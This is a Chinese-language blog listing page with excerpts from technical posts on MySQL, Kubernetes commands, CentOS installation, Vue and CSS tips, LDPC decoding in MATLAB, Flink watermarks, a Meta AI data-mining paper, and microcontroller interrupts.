		<h2 class="list__title post__title">
			<a href="/posts/6967b78e596ebedb4068045a24b669f7/" rel="bookmark">
			mysql操作实战案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.搭建mysql服务
安装MySQL
2.创建一个以你名字为名的数据库，并创建一张表student，该表包含三个字段（id，name，age），表结构如下：
mysql&gt; desc student; +-------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +-------+--------------+------+-----+---------+----------------+ | id | int(11) | NO | PRI | NULL | auto_increment | | name | varchar(100) | NO | | NULL | | | age | tinyint(4) | YES | | NULL | | +-------+--------------+------+-----+---------+----------------+ 3 rows in set (0.01 sec) mysql&gt; create database zhouwei; //创建数据库 Query OK, 1 row affected (0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6967b78e596ebedb4068045a24b669f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f7684c30f5a631f89b015b28645898b/" rel="bookmark">
			Linux获取纳秒级别时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在 Linux 系统中可以使用 gettimeofday 函数来获取时间，这个函数能够以毫秒的精度来获取时间 struct timeval tv; gettimeofday(&amp;tv, NULL); time_t cur_time = tv.tv_sec; long cur_time_ms = tv.tv_usec/1000; printf(“cur_time = %d \n”, cur_time); printf(“cur_time_ms = %ld \n”, cur_time_ms); Linux 系统可以使用 clock_gettime 函数来获取时间精度，其可以以纳秒的精度获取时间 struct timespec ts; clock_gettime(CLOCK_REALTIME, &amp;ts); Time_t cur_time = ts.tv_sec; long cur_time_us = ts.tv_nsec/1000; printf(“cur_time = %d \n”, cur_time); printf(“cur_time_us = %ld \n”, cur_time_us); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ee9a8b1d61b187ac26082437f6390d2/" rel="bookmark">
			Kubernetes_概念篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kubernetes_概念篇 一、架构二、概念1，Label（对象标签）2，Namespace3，Deployment4，Service 三、资源对象Master组件1，kube-apiserver2，kube-controller-manager3，kube-scheduler4，Node组件 5，Deployment6，Service7，Pod 四、核心组件五、集群一个节点内容 一、架构 核心层 Kubernetes 最核心的功能，对外提供 API 构建高层的应用，对内提供插件式应用执行环境 应用层 部署（无状态应用、有状态应用、批处理任务、集群应用等）和路由（服务发现、DNS 解析等） 管理层 系统度量（如基础设施、容器和网络的度量），自动化（如自动扩展、动态 Provision 等）以及策略管理（RBAC、Quota、PSP、NetworkPolicy 等） 接口层 kubectl 命令行工具、客户端 SDK 以及集群联邦 生态系统 外部 日志、监控、配置管理、CI、CD、Workflow等 内部 CRI、CNI、CVI、镜像仓库、Cloud Provider、集群自身的配置和管理等 二、概念 1，Label（对象标签） key/value 附加在对向上等式 app=nginx 和 env！=product 集合 如 env in (production,qa) 多个label（AND关系) app=nginx，env=test 2，Namespace 一组资源和对象集合，用来将内部对象划分为不同的项目组/用户组pods，services，deployments 等都属于某一个namespace（默认default）Node、PersistenVolumes 等则不属于任何namespace 3，Deployment 确保任意时间都有指定数量的，Pod（副本）在运行某个Pod 不响应，Deployment会替换他创建Deployment Pod模板：用来创建Pod副本的模板Label 标签：deployment 需要监控的Pod的标签 4，Service 应用服务的抽象，通过labels 为应用提供负载均衡和服务发现匹配 labels 的 Pod Ip 和端口列表 组成endpointskube-proxy 负责将服务IP负载均衡到这些 endpoints上每个Service 都会自动分配一个 cluster IP（仅在集群内部可访问的虚拟地址）和DNS名其他容器可以通过该地址、DNS来访问服务，不需要了解后端容器的运行 三、资源对象 Master Master节点是Kubernetes 集群的控制节点，负责整个集群的管理和控制
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ee9a8b1d61b187ac26082437f6390d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fed2a308edab67be0be2e565dd5e35df/" rel="bookmark">
			Linux系统Centos7发行版下载安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Centos7下载步骤Centos7安装教程 Centos7下载步骤 访问Centos官网 1 下载链接，我是Windows操作系统，选择的是x86_64（点击x86_64）
这里随便选择一个下载源，我选的是：http://mirrors.nju.edu.cn/centos/7.9.2009/isos/x86_64/
进入下载源，选择自己需要的版本，我下载的是Minimal精简版（包含核心组件）
DVD、Everything、Minimal、NetInstall版本的区别？
DVD：这个是常用版本，就是普通安装版，里面包含大量的常用软件，大部分情况下安装时无需再在线下载，体积为4G（有系统桌面）Everything：和DVD差不多，但包含了所有软件组件，体积庞大，高达7GMinimal：精简版本，包含核心组件，体积才1G不到（没有系统桌面）NetInstall：网络安装版本，一般不用这个版本 根据自己的需要，选择版本下载即可，一般服务器都是使用 Minimal 版本，体积小
Centos7安装教程 安装需要有虚拟机，若没有虚拟机，需要下载安装并创建虚拟机 2。
需要新建虚拟机，然后编辑虚拟机设置
选择新 CD/DVD，选择使用 ISO 映像文件（Linux系统 ISO 文件），根据自己下载存放的目录路径选择，选择后关闭
启动虚拟机，选择 Install CentOS7，需要等待一会
下拉选择语言中文，简体中文
软件选择，默认是最小安装，由于我安装的 CentOS 是精简版，所以只有最小安装，如果你是 DVD 版，可以选择桌面
选择安装位置，选择我要配置分区
我们新建三个分区，分别是boot、swap、root，容量分配分别是1G、2G、17G，其中设备类型都选标准分区，文件系统，除了swap选swap，其他的都选ext4
选择网络和主机名，以太网开启
都配置好后，开始安装
设置ROOT密码，最后重启
进来后需要登录，用户名ROOT，密码是刚刚设置的ROOT密码
Centos官网：https://www.centos.org/download/ ↩︎
VMware Workstation Pro 17下载安装和虚拟机创建教程：https://blog.csdn.net/qq_45674493/article/details/128406891 ↩︎
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3136282849c3df491d480533b1e390f/" rel="bookmark">
			花生壳内网穿透发现突然连接不上了（请检查内网主机IP和端口）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		太坑了，终于找到原因了：
链接：花生壳内网穿透发现突然连接不上了（请检查内网主机IP和端口）_季南枫(JIM)的博客-CSDN博客
感谢，特此记录
当我打开映射时，出现连接失败的信息：
除了官方说的内网端口号错误或ip错误之外，还有一个原因会造成这样的错误，就是你的SN设备未登陆账号，如下：
解决方法：
点击未登陆按钮实现登录即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f890a1266d5738338d5f2f03216f02ba/" rel="bookmark">
			Vue3 ElementPlus el-cascader级联选择器动态加载数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考了这位的大佬的写法
element el-cascader动态加载数据 （多级联动，落地实现）_el-cascader 动态加载_林邵晨的博客-CSDN博客
&lt;el-cascader style="width: 300px" :props="address" v-model="addressValue" clearable /&gt; import { ref } from 'vue'; // 省市区接口 改成自己定义的api方法名 import { commonAdministrative } from '@/api/modules/common'; // 默认值 回显数据格式 ['区级code1', '区级code2', '区级code3'] let addressValue = ref(['000001', '000002', '000003']) // 省市区 let address = { lazy: true, // 开启懒加载 // checkStrictly: true, //可选择任意节点 async lazyLoad(node, resolve) { // node为当前点击的节点，resolve为数据加载完成的回调(必须调用) const nodes = []; // 构造查询条件 =&gt; 接口入参 let params = { parentAreaCode: node.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f890a1266d5738338d5f2f03216f02ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a12c8b593dcb16171310a1395e489d7/" rel="bookmark">
			CSS实现隐藏滚动条但可以滚动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景 隐藏滚动条，但可以滚动
解决 全局样式
/* 隐藏滚动条 */ .outer-container::-webkit-scrollbar { width: 0; /* 设置滚动条的宽度为0 */ background-color: transparent; /* 设置滚动条背景为透明 */ } /* 自定义滚动条轨道样式 */ .outer-container::-webkit-scrollbar-track { background-color: transparent; /* 设置滚动条轨道背景为透明 */ } /* 自定义滚动条滑块样式 */ .outer-container::-webkit-scrollbar-thumb { background-color: transparent; /* 设置滚动条滑块背景为透明 */ } 结语 感谢读者阅读并关注博客文章，并对文章中提到的观点、建议或批评表示感谢
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5116388af07c93229b85a0128966581/" rel="bookmark">
			在使用Vant组件库时，实现下拉刷新，只有在列表顶部才会刷新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景 官方代码，是只要下拉就会刷新，但这并不是我们想要的，我们想要实现下拉刷新，只有在列表顶部才会刷新
解决 全局样式
.van-pull-refresh { height: calc(100vh - 100px) !important; overflow: auto !important; } 结语 感谢读者阅读并关注博客文章，并对文章中提到的观点、建议或批评表示感谢
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9818943da131797535e480c4c789843/" rel="bookmark">
			Vue项目自动设置版本号，版本号变更清空缓存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue项目自动设置版本号，版本号变更清空缓存 前言 项目每次打包后都需要手动改动项目版本号，这个改动每次都需要在package.json中修改version，比较麻烦，。
项目更新后文件存在缓存，需要强制刷新才能呈现更新
解决 安装npm依赖
npm install --save-dev @intervolga/optimize-cssnano-plugin@1.0.6 webpack-bundle-analyzer@4.4.0 compression-webpack-plugin@4.0.0 moment@2.29.1 在你的 package.json 文件中添加以下 scripts
"scripts": { "version": "node ./build/version.js", "build": "npm run version &amp;&amp; vue-cli-service build" } 在你的项目根目录下创建 build 文件夹，并在该文件夹下创建 version.js 文件
在 version.js 文件中添加以下代码
const fs = require('fs'); const path = require('path'); const moment = require('moment'); const packageJsonPath = path.resolve(__dirname, '../package.json'); const indexPath = path.resolve(__dirname, '../public/index.html'); // 读取 package.json 文件 const packageJson = fs.readFileSync(packageJsonPath, 'utf8'); const packageData = JSON.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c9818943da131797535e480c4c789843/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17c86feaf81346bdd5fa29569297ea76/" rel="bookmark">
			规则LDPC和不规则LDPC译码算法MATLAB仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		up目录
一、理论基础
二、核心程序
三、测试结果
一、理论基础 LDPC（Low-Density Parity-Check）编码是一种纠错码技术，分为规则LDPC编码和不规则LDPC编码两种类型，它们在纠错性能和结构上有所不同。下面详细介绍这两种类型的LDPC编码：
规则LDPC编码： 规则LDPC编码的特点是每个校验节点和信息节点连接的数量都是固定的，因此在整个编码矩阵中，节点的度数是相同的。这种编码的结构相对简单，通常采用常见的几何结构，如正则图、正则矩阵等。规则LDPC编码的校验矩阵通常具有良好的解码性能和较低的复杂度。
不规则LDPC编码： 不规则LDPC编码的特点是校验节点和信息节点之间的连接数量是可变的，导致整个编码矩阵中节点的度数不同。不规则LDPC编码的设计更加灵活，可以根据需要优化纠错性能和译码复杂度。不规则LDPC编码在某些情况下可以获得更好的性能，特别是在高信噪比下。
编码和译码过程： LDPC编码过程是基于稀疏校验矩阵的线性运算，将输入数据与校验位进行异或运算，生成编码数据。LDPC译码过程是基于图论和迭代译码算法，如Belief Propagation（BP）算法或Sum-Product Algorithm（SPA）等，通过在校验节点和信息节点之间传递信息，进行迭代反馈，逐步纠正和恢复接收到的数据。
性能比较：
规则LDPC编码具有结构简单、解码性能稳定、硬件实现方便等特点。它在相对低的迭代次数下就能获得良好的纠错性能。不规则LDPC编码具有更好的纠错性能潜力，特别是在高信噪比下。它可以通过适当的设计来优化解码性能，但也可能在一些情况下需要更多的迭代次数来达到最佳性能。 总之，规则LDPC编码和不规则LDPC编码在结构和性能上有一些不同，可以根据应用需求和性能要求来选择合适的编码类型。不规则LDPC编码通常能够获得更好的性能，但相应地可能需要更高的计算复杂度。
LDPC码是根据低密度稀疏校验矩阵H来构造的。假设需要发送一组信息T{t_1,t_2,⋯,t_n}，在发送前先使用生成矩阵G做线性变换，得到发送码字S=GTT，而校验矩阵H与生成矩阵G满足的关系为HGT=0，可以看到发送的码字是一组线性校验方程的解。
LDPC码与分组码的最大区别：在于译码方式的不同。LDPC码采用迭代译码，校验矩阵H使用Tanner图表示。
LDPC码的核心：围绕校验矩阵Hm×n的特性进行设计。
LDPC码本身的结构引入了交织(interleaving)。
不同LDPC码的构造方法都是为了实现如下的目标：① 增大Girth值；② 减小编码复杂度。
根据H构造不同，分成了LDPC规则码和LDPC不规则码。直观地说，稀疏矩阵每行每列1的个数固定的LDPC码称为LDPC规则码。稀疏矩阵每行每列1的个数或者行和列的重量不固定的LDPC码称为LDPC不规则码。根据LDPC的码元是否为二进制，分成了二元LDPC码和高阶域LDPC码。高阶域LDPC码定义在GF(q)上，其中q= 2m。
LDPC译码采用BP译码算法，该方法通过校验节点向变量节点传递信息以及变量节点向校验节点传递信息的方式，并经过迭代，得到近似ML的译码结果。
这里说说自己的理解，LDPC编码的时候发送的原始比特会存在于多个校验方程中，一个校验方程中也会包含多个比特，这样就可以互相校验。对于某个校验方程，其他比特为1的个数为偶数，为使得校验结果为0，则本比特位置为0，反之则为1。而我们需要计算的是其他比特为偶数个1和奇数个1的概率。对于某个比特，由于其存在于多个校验方程中，因此，其他校验方程是可以给出本比特取值的概率的。在迭代过程中就是反复利用以上关系更新各节点的概率，最后得到译码结果的。
根据H[c w]T=0以及上述矩阵结构，可以将w写成[p1 p2]两部分组成。其中p1的长度为4，p2的长度为42。那么式子H[s w]T=0可改写成，此处为便于区分用s指代以上的c。
可求得p1和p2的结果如下：
那么问题的关键是如何计算B-1。协议中Graph=1的情况下，B矩阵的形式如下： 以上1表示对单位阵循环右移，0表示单位阵，X表示全0阵，那么根据逆矩阵的定义即可求得B-1，如下式：
求取上述矩阵中的x1~x16即可得到逆矩阵。由于计算是定义在GF(2)上的，因此两个相同的矩阵相加为0，这样就能简便地计算出结果。另外，需要注意的是，在译码的时候，需要人为地在译码结果前面加上2Zc长度的0来补齐长度。 二、核心程序 function x_hat = func_Dec(y,sigma,H,max_iter) f1 = 1./(1+exp(-2*y/(sigma^2))); f0 = 1-f1; [m,n] = size(H); if m&gt;n H = H'; [m,n] = size(H); end %如果不是稀疏矩阵，将H变为稀疏矩阵 if ~issparse(H) [ii,jj,sH] = find(H); H = sparse(ii,jj,sH,m,n); end %初始化 [ii,jj] = find(H); %将非零元素标上 indx = sub2ind(size(H),ii,jj); q0 = H * spdiags(f0(:),0,n,n); sq0 = full(q0(indx)); sff0 = sq0; q1 = H * spdiags(f1(:),0,n,n); sq1 = full(q1(indx)); sff1 = sq1; k=0; success = 0; while ((success == 0) &amp; (k &lt; max_iter)), k = k+1; %若先验概率一样的话，令sdq为一个很小很小的数 sdq = sq0 - sq1; sdq(find(sdq==0)) = 1e-20; %用概率差sdq构成m*n的稀疏矩阵 dq = sparse(ii,jj,sdq,m,n); %将dq在对数域求和，即将dq相乘，构成数组 Pdq_v = full(real(exp(sum(spfun('log',dq),2)))); %更新了rij Pdq = spdiags(Pdq_v(:),0,m,m) * H; sPdq = full(Pdq(indx)); sr0 = (1+sPdq.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17c86feaf81346bdd5fa29569297ea76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c0ab7a553d74b8ddad6fc475db62244/" rel="bookmark">
			Flink之Watermark
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.乱序问题 流处理从事件产生，到流经source，再到operator，中间是有一个过程和时间的，虽然大部分情况下，流到operator的数据都是按照事件产生的时间顺序来的，但是也不排除由于网络、分布式等原因，导致乱序的产生，所谓乱序，就是指Flink接收到的事件的先后顺序不是严格按照事件的Event Time顺序排列的。
一旦出现乱序，如果只根据eventTime决定window的运行，我们不能明确数据是否全部到位，但又不能无限期的等下去，此时必须要有个机制来保证一个特定的时间后，必须触发window去进行计算了，这个特别的机制，就是Watermark。
例如：某App会记录用户的所有点击行为，并回传日志（在网络不好的情况下，先保存在本地，延后回传）。A用户在11:02对App进行操作，B用户在11:03对App进行操作，但是A用户的网络不太稳定，回传日志延迟了，导致我们在服务端先接受到B用户11:03的消息，然后再接受到A用户11:02的消息，消息乱序了。
2.什么是Watermark Watermark是Apache Flink提出的一种用来解决乱序、延迟数据等情况的解决方案。
它是建立在事件时间上的一个概念，用来刻画数据流的完整性。如果按照处理时间来衡量事件，一切都是有序的、完美的，自然而然也就不需要Watermark了。换句话说事件时间带来了乱序的问题，而Watermark就是用来解决乱序问题。所谓的乱序，其实就是有事件延迟了，对于延迟的元素，我们不可能无限期的等下去，必须要有一种机制来保证一个特定的时间后，必须触发Window进行计算。这个特别的机制,就是Watermark,它告诉了算子延迟到达的消息不应该再被接收。
watermrk具体特点如下：
Watermark是一种衡量Event Time进展的机制。Watermark是用于处理乱序事件的，通常用Watermark机制结合window来实现。数据流中的Watermark用于表示timestamp小于Watermark的数据，都已经到达了，因此，window的执行也是由Watermark触发的。Watermark可以理解成一个延迟触发机制，我们可以设置Watermark的延时时长t，每次系统会校验已经到达的数据中最大的maxEventTime，然后认定eventTime小于maxEventTime - t的所有数据都已经到达，如果有窗口的停止时间等于maxEventTime – t，那么这个窗口被触发执行。watermark 用来让程序自己平衡延迟和结果正确性。 3.Watermark原理 Watermark会携带一个单调递增的时间戳t，Watermark(t)表示所有时间戳不大于t的数据都已经到来了，未来小于等于t的数据不会再来，因此可以放心地触发和销毁窗口了。
当Flink,接收到数据时，会按照一定的规则去生成Watermark，这条Watermark就等于当前所有到达数据中的maExertT me"-延N时长，也就定说，Watermark是基于数据携带的时间戳生成的，一旦Watermark比当前未触发的窗口的停止时间要晚，那么就会触发相应窗口的执行。由于eventtime是由数据携带的，因此，如果运行过程中无法获取新的数据，那么没有被触发的窗口将永远都不被触发。
4.延迟数据处理机制 Watermark能够应对乱序的数据，但是真实世界中没法得到一个完美的 Watermark数值。要么没法获取到，要么耗费太大，因此实际工作中会近似 Watermark(t)之后，还有较小的概率接收到时间戳t之前的数据，在Flink中将这些数据定义为“late elements”，可以在Window中指定允许延迟的最大时间（默认为О)。
延迟事件是乱序事件的特例，和一般乱序事件不同的是它们的乱序程度超出了水位线( Watermark)的预计，导致窗口在它们到达之前已经关闭。
延迟事件出现时窗口已经关闭并产出了计算结果，对于此种情况处理的方法有3种:
重新激活已经关闭的窗口并重新计算以修正结果。将延迟事件收集起来另外处理。将延迟事件视为错误消息并丢弃。 Flink默认的处理方式是第3种直接丢弃，其他两种方式分别使用Side Output和AllowedLateness。
Side Output机制：将延迟事件单独放入一个数据流分支，这会作为Window计算结果的副产品，以便用户获取并对其进行特殊处理。迟来的数据同样可以触发窗口，进行输出。Allowed Lateness机制：允许用户设置一个允许的最大延迟时长。Flink会在窗口关闭后一直保存窗口的状态直至超过允许延迟时长，这期间的延迟事件不会被丢弃，而是默认会触发窗口重新计算。因为保存窗口状态需要额外内存，并且如果窗口计算使用了ProcessWindowFunction APl还可能使得每个延迟事件触发一次窗口的全量计算，代价比较大，所以允许延迟时长不宜设得太长，延迟事件也不宜过多。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4979a1c70dfeb7107cc9eccfe66b0187/" rel="bookmark">
			RabbitMQ Messages In ASP.NET Core
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 RabbitMQ 实现一个简单的发布方法
RabbitMQ Message Queue Using .NET Core 6 Web API
Consuming RabbitMQ Messages In ASP.NET Core
How to use RabbitMQ in ASP.NET Core
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/642008b0a57efd255bcef7373c56a2db/" rel="bookmark">
			KS8基础命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		KS8基础命令 一、设置服务开机自启动
设置kubelet开机自启动：systemctl enable kubelet
设置docker开机自启动：systemctl enable docker
二、查看pod状态
命令查看 Pod 的状态： kubectl get pod --all-namespaces
三、集群初始化
Kubernetes初始化：kubeadm init --kubernetes-version=v1.11.1 --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 --ignore-preflight-errors=Swap
四、查看集群状态
集群状态检测：kubectl get nodes
kubectl get cs
五、查看pod描述
查看 Pod 具体情况：kubectl describe pod calico-node-4gm72 --namespace=kube-system
六、创建删除查看实例
创建实例：kubectl create -f kubernetes-dashboard.yaml
kubectl create -f Nginx.yaml
查看实例日志：kubectl logs -f kubernetes-dashboard-4291928047-5x372 --namespace=kube-system
查看pod实例分配的Ip地址：kubectl get pods -o wide
删除实例：kubectl delete -f kubernetes-dashboard.yaml
七、查看pod状态
查看pod状态：kubectl get pod -n kibe-system
查看pod描述信息：kubectl describe pod kubernetes-dashboard -n kibe-system
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/642008b0a57efd255bcef7373c56a2db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da01e121319dd0c509c1e713cd04405a/" rel="bookmark">
			Meta AI | 指令回译：如何从大量无标签文档挖掘高质量大模型训练数据？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是HxShine。
还在担心没有大模型没有指令遵循数据吗？快来看看meta的Humpback吧!
今天分享的文章来自Meta AI，self-Alignment with Instruction Backtranslation[1]：通过指令反向翻译进行自对准。
这篇文章是一种从互联网大量无标签数据中挖掘高质量的指令遵循数据集的方案，它利用少量种子数据，从大量互联网上无标签的数据，挖掘出大量高质量的、多样性也不错的训练数据，成功将llama（美洲驼）进化成Humpback（座头鲸）。
一、概述 Title：Self-Alignment with Instruction Backtranslation
论文地址：https://arxiv.org/pdf/2308.06259.pdf
1 Motivation 现状：高质量指令数据太少，互联网上human-written text倒是比较多，但是大量的无标签数据缺乏对应的指令。
目标：研究如何利用互联网上大量的无标签的数据，生成高质量的指令集，进而提升模型的表现。
大白话：无标签文本 -&gt; 对应的指令是什么?
2 Methods 主要依赖于两个假设：
1. 在互联网上大量的无标签数据中，有些是可以作为user instructions的标准回复gold answer的。
2.根据gold answers生成的指令，可以作为一个高质量的样本去训练指令遵循模型。
指令回译具体内容：
self-augmentation：利用种子数据训练模型并从无标签数据生成指令。1. 指令预测模型（Myx）训练：先利用少量的instruction，output数据对，训练LLama模型让其学习根据output生成对应instruction的能力。2. 利用指令预测模型Myx + 大量无标签数据 =&gt; 生成候选指令A。
self-curation: 从候选指令A中选择部分高质量的（instruction，output）数据对，然后迭代训练指令预测模型v2版本，通过这种方式迭代2轮，提升生成的指令集的质量。
步骤1 Initialization（初始化设置）：收集少量种子数据和大量无标注的文本 Seed Data训练：收集少量的种子instruction，output数据，从两个方向来训练模型，第一种是根据指令生成回复。第二种种是根据回复生成指令。
Unlabelled data数据处理：对于每个文档，提取HTML标题后面的文本部分。并进行重复数据删除、长度过滤，并使用几种启发式方法删除潜在的低质量段，例如标题中大写字母的比例。
步骤2 Self-Augmentation (generating instructions指令生成)：训练指令预测模型并根据无标签数据生成指令 指令预测模型训练，利用（output，instruction）训练指令预测模型，用于根据无标签的数据生成指令。注意：并不是所有的候选指令对都是高质量的，如果将它们全部用于训练不一定会有益。
步骤3 Self-Curation (selecting high-quality examples指令挑选)：利用大模型本身筛选高质量的数据构建新的数据集 筛选打分步骤：
仅根据seed（指令、输出）种子示数据训练模型M0。
使用M0为每个增强示例{(xˆi, yi)}评分，以得出质量评分ai。使用提示对生成的候选指令进行评级打分（5个纬度）。
选择分数为ai ≥ k的增强示例的子集来形成高质量数据集。
筛选评分的prompt：
Iterative self-curation：迭代方法产生更高质量的预测结果。
在第t次迭代上，我们使用上一轮t-1迭代模型挑选的数据A(t-1)与种子数据一起作为训练数据，进行微调训练当前轮模型Mt。
这个模型反过来可以用于对质量的增强示例进行重新评分，从而产生一个增强集A(t)。这里执行两次数据选择和微调，以获得最终的模型M2。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da01e121319dd0c509c1e713cd04405a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33077e95a5b72e40712e26f87e7bad4b/" rel="bookmark">
			【JS案例】JS实现图片放大镜功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JS案例·图片放大镜
🌟效果展示 🌟HTML结构
🌟CSS样式
🌟实现思路 🌟具体实现 1.初始化数据图片
2.获取所需DOM元素
3.初始化页面
初始化缩略图
绑定事件
🌟完整代码
🌟写在最后 🌟效果展示 🌟HTML结构 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel="stylesheet" href="./index.css"&gt; &lt;/head&gt; &lt;body&gt; &lt;!--最外层容器 --&gt; &lt;div class="container"&gt; &lt;!-- 左侧原图 --&gt; &lt;div class="left-img"&gt; &lt;!-- 遮罩层 --&gt; &lt;div class="mask"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 右侧放大图片 --&gt; &lt;div class="right-img"&gt;&lt;/div&gt; &lt;!-- 缩略图集合 --&gt; &lt;div class="img-list-wrapper"&gt; &lt;ul class="img-list"&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="./index.js"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 🌟CSS样式 * { margin: 0; padding: 0; list-style: none; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33077e95a5b72e40712e26f87e7bad4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01503855082b796fd0b229bffcb12fe9/" rel="bookmark">
			基于 SpringBoot 的生鲜冷链系统的设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、项目介绍 随着社会的发展，消费者对生鲜食品的质量要求越来越高，安全、新鲜、营养、好 吃等都成为消费者选购果蔬产品的重要指标[1]。一个好的供应商需要能够提供物美价廉 的商品，提高强化竞争力并带来一定的利润，要有永续经营的理念[2]。这种供货商成为 合作伙伴，才是采购要积极寻找的目标。为了节约采购成本和保证供给，要充分利用供 应商关系管理系统与电子商务技术和电子采购平台来寻找最佳资源，与供应商建立长期 合作的伙伴关系，同时由于食品行业的特殊性，要对采购物料实行批次跟踪与保质期限 管理，能够从产成品到半成品、原材料、供应商等进行追溯跟踪，在确保质量的同时能 够发现问题和及时解决问题。
二、模块介绍 系统模块： 根据业务的需求进行系统模块可以划分为权限管理、供应商管理模块、商品管理模 块、购物车模块、订单模块、数据统计模块；此系统根据用户角色不同展示不同界面， 分配不同权限。商品从需求订单到入库、分拣、出库配送物流等通过此系统跟踪操作， 完善商品冷链配送情况。 功能架构： 消费者用户系统：用户登录、浏览商品、查看订单信息、历史订单、购物车、下单。 系统管理后台：员工权限管理、供应商管理、商品管理、供应商/商品信息浏览、员 工登录、订单管理。 角色： 后台系统超级管理员：登录后台管理系统，拥有系统所有操作权限。 后台管理员：登录后台管理系统，员工权限操作，供货商、商品管理。 员工：登录管理系统，商品入库，质检，分拣发货售后管理。 用户：登录注册系统，完善信息，浏览商品、添加购物城、在线下单等，使用前端框架 layUI 和 目前流行框架 SpringBoot，采用关系数据库 MySQL 用来组织、存储和管理数据的仓库， 以实现供应商、用户的需求。
生鲜冷链流程图，如图：
用户登录：系统的登录功能是不可缺少的，用户通过账户密码登录，同时输入验证 码才能验证通过登录成功。 供应商管理模块：可以上传商家信息，编辑/更新商家信息，删除商家信息等操作。
商品管理模块：上传商品信息、图片分类等操作，编辑/更新商品的信息，删除商品 信息，同步商品信息等操作。
购物车模块：此模块提供给消费群体，消费者可以浏览所有的商品信息，挑选商品 选中喜欢的商品添加至订单中。
订单模块：消费者将选中的商品添加到订单中，可以通过订单模块浏览所有的订单 信息，并且可以查看订单详情。
三、数据库设计 用户表（sys_user）
静态表（sys_type）
供应商表（sys_supplier）
商品表（sys_product）
订单表（sys_order）
四、页面展示 登录页面：
统计管理模块：
权限管理模块：
供应商管理模块：
商品管理模块：
订单信息模块：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bba1462f2258b3bf4d60c5384b8dd38f/" rel="bookmark">
			51--定时器/计数器，串口，中断的巧妙关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是中断
什么是定时器计数器
什么是串口 开始
直接配置中断 中断+定时器/计数器
串口+中断
总结 中断查询次序号：
什么是中断 中断是为使单片机具有对外部或内部随机发生的事件实时处理而设置的， 中断功能的存在，很大程度上提高了单片机处理外部或内部事件的能力。
